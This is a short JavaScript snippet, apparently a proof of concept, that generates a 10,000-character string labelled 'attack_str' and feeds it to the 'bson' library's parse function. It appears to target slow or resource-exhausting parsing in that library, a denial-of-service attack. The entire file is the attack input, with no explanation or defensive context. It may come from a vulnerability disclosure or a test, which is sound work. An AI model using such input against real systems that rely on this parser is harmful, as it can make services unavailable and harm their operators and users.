const BSON = require('bson');
const { genstr } = require('./utils');

attack_str = genstr(10000,"s");
BSON.parse(attack_str);